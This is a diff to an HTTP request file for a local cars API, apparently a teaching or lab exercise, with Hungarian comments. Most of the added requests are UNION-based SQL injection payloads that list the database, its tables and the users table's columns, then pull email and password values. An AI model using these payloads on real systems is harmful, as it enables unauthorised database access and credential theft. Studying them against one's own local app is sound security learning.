@@ -1,2 +1,20 @@
 ### get cars
 get http://localhost:3000/cars
+
+### get car by id
+get http://localhost:3000/cars/1
+
+### sql inections
+### get adabázis
+get http://localhost:3000/cars/1  UNION SELECT database(), '', '', ''
+
+### get táblák nevei
+get http://localhost:3000/cars/1  union select table_name, '','', '' from information_schema.tables where table_schema='cars'
+
+### users tábla oszlopai
+get http://localhost:3000/cars/1 union select column_name, '', '', data_type from information_schema.columns where table_name='users' and table_schema='cars'
+
+
+### get user adatok
+get http://localhost:3000/cars/1 union select email, password, '','' from users
+
